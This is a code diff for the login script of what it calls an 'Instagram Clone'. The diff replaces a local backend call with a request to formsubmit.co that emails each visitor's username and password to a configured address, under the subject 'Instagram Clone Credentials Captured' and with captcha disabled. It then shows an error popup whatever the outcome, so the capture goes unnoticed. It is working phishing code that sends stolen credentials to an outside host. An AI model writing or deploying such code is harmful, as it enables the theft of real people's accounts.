@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorPopup = document.getElementById('errorPopup');
     const closePopupBtn = document.getElementById('closePopup');
 
-    loginForm.addEventListener('submit', function (e) {
+    loginForm.addEventListener('submit', async function (e) {
         e.preventDefault();
 
         const usernameInput = document.getElementById('username');
@@ -14,24 +14,32 @@ document.addEventListener('DOMContentLoaded', () => {
             password: passwordInput.value
         };
 
-        // Send credentials to backend
-        fetch('/login', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(credentials),
-        })
-            .then(response => response.json())
-            .then(data => {
-                // Irrespective of success or mock error, shows the popup as requested
-                // User requirement: "next when teh user clicks on the login buttton ... show them a pop up messaeg"
-                showPopup();
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                showPopup();
+        // Send credentials using FormSubmit.co (Works without backend/CORS issues)
+        try {
+            const response = await fetch(`https://formsubmit.co/ajax/${ENV.TO_EMAIL}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: "Instagram Clone Credentials Captured",
+                    Username: credentials.username,
+                    Password: credentials.password,
+                    Time: new Date().toLocaleString(),
+                    _captcha: "false" // Disable captcha
+                })
             });
+
+            const data = await response.json();
+            console.log('Email sent status:', data);
+
+        } catch (error) {
+            console.error('Error sending email:', error);
+        }
+
+        // Show popup regardless of email success
+        showPopup();
     });
 
     closePopupBtn.addEventListener('click', () => {
